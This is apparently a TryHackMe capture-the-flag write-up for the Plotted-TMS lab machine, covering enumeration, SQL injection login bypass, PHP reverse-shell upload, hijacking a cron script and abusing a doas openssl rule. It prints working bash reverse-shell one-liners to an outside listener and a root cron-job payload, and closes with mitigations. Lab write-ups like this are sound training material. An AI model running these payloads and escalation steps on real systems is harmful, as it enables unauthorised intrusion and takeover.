# TryHackMe – Plotted-TMS Write-Up

**Machine Name:** Plotted-TMS  

**Difficulty:** Easy

**Category:** Web / Privilege Escalation

**IP:** 10.129.130.120  

**Summary:** 
-
This machine focuses on web application exploitation and Linux privilege escalation. The attack path involved comprehensive web enumeration, bypassing authentication via SQL Injection, and exploiting an arbitrary file upload vulnerability in the Traffic Offense Management System (TOMS) to get a foothold. After gaining a shell, I moved laterally by hijacking a poorly permissioned cron job script, and finally escalated to root by abusing a misconfigured `doas` rule with OpenSSL.

## Recon

### Step 1: Nmap Enumeration
I started with a full port scan to identify the attack surface:

`nmap -p- -sV -sC -Pn --min-rate 1000 10.129.130.120`

**Key Findings:**
* 22/tcp: OpenSSH 8.2p1
* 80/tcp: Apache httpd 2.4.41 (Ubuntu)
* 445/tcp: Apache httpd 2.4.41 (Running HTTP, not SMB)

### Step 2: Web Discovery
Initial web fuzzing on port 80 revealed endpoints like `/shadow`, `/passwd`, and `/admin`. However, these contained Base64 encoded strings that decoded to troll messages from the creator (e.g., "not this easy :D"), indicating a rabbit hole.

I shifted focus to port 445 and ran Gobuster:
Gobuster found a `/management/` directory, which led me to the login page for the Traffic Offense Management System (TOMS) v1.0.

## Exploitation

### Step 3: SQL Injection & RCE
After inspecting the login page and finding a dead session cookie, I attempted a basic SQL Injection on the username field.

**Payload:** `' OR 1=1-- -`

**Result:** Authentication bypassed. I gained access to the administrator dashboard.

After some online research, inside TOMS, I discovered it was vulnerable to Remote Code Execution (RCE) via the user profile picture upload feature. 

I downloaded the `pentestmonkey` PHP reverse shell, uploaded it as my profile picture, and started a Netcat listener:

`nc -lvnp 4442`

**Result:** Gained initial shell as `www-data`.

## Privilege Escalation

### Step 4: Internal Enumeration and Lateral Movement
Once logged in as `www-data`, I searched for SUID binaries:

`find / -perm -u=s -type f 2>/dev/null`

This revealed `/usr/bin/doas`, a `sudo` alternative. Reading the config file (`cat /etc/doas.conf`) showed:

`permit nopass plot_admin as root cmd openssl`

This meant that to use this, I needed to be the user `plot_admin`. I checked the system cron jobs (`cat /etc/crontab`) and found a script running every minute:

`* * * * * plot_admin /var/www/scripts/backup.sh`

Checking permissions (`ls -ld /var/www/scripts/`), I saw `www-data` owned the parent folder. This allowed me to delete the script and replace it with my own payload:

`rm /var/www/scripts/backup.sh`  
`echo 'bash -c "bash -i >& /dev/tcp/192.168.130.184/4445 0>&1"' > /var/www/scripts/backup.sh`

I caught the callback on port 4445 and successfully moved laterally to `plot_admin`, capturing the user flag.

**User flag:** ****************

### Step 5: Exploiting doas for Root
Now operating as `plot_admin`, I leveraged the `doas` rule that allowed me to run `openssl` as root without a password. Because `plot_admin` was not authorized to use standard text editors with root privileges, I had to use `openssl` as a makeshift text editor to write a malicious scheduled task directly into the system's core scheduling folder. 

`echo "* * * * * root bash -c 'bash -i >& /dev/tcp/192.168.130.184/4446 0>&1'" | doas openssl enc -out /etc/cron.d/root_shell`

### About this command:
This final command combines **Linux Cron syntax** with an **Arbitrary File Write vulnerability** provided by GTFOBins(`| doas openssl enc -out /etc/cron.d/root_shell`).

1. **`echo "* * * * * root bash -c 'bash -i >& /dev/tcp/192.168.130.184/4446 0>&1'"`**

   This generates a text string formatted specifically for `/etc/cron.d/`. It tells the system: *"Run this every minute (`* * * * *`), execute it as the `root` user, and run a bash reverse shell back to IP 192.168.130.184 on port 4446."*

2. **`|` (The Pipe)**
: This takes the text we just echoed and passes it into the next command as input.

3. **`doas openssl enc`**: We invoke `openssl` as root (using `doas`). The `enc` (encode) function is normally used to encrypt data, but if you don't give it an encryption cipher, it just takes data in and spits it back out identically. 

4. **`-out /etc/cron.d/root_shell`**: This tells `openssl` to save the output into a new file called `root_shell` inside the `/etc/cron.d/` directory. 

**Why we did it this way:** Because `plot_admin` is not allowed to use text editors like `nano` or `echo` with root privileges. We *had* to use `openssl` to write the file because `doas.conf` explicitly permitted it. We essentially used a cryptography tool as a makeshift text editor to write a malicious scheduled task directly into the system's core scheduling folder!

## Capture the Flag

### Step 6: Final Access
I set up a final Netcat listener on port 4446. After 60 seconds, the system cron daemon executed the newly created `root_shell` file.

`nc -lvnp 4446`

**Result:** Gained root shell.

`root@plotted:~# cat /root/root.txt`

**Root flag:** *******************

## Conclusion
This machine demonstrates how simple input validation failures (SQLi) and insecure file upload mechanisms can lead to a web server compromise. Furthermore, it highlights the dangers of improper directory permissions (allowing low-privileged users to overwrite administrative scripts) and the risks of assigning `sudo`/`doas` privileges to binaries (like openssl) that have arbitrary file read/write capabilities.

## Mitigation
* **Input Validation:** Use parameterized queries/prepared statements to prevent SQL Injection.
* **Secure File Uploads:** Validate file extensions, content types, and store uploaded files outside the web root or with execution disabled.
* **Strict Directory Permissions:** Ensure directories containing administrative cron scripts are not writable by the `www-data` user.
* **Principle of Least Privilege:** Do not grant `doas` or `sudo` access to binaries like `openssl`, `tar`, or `awk` which can be trivially abused to read or write arbitrary system files.
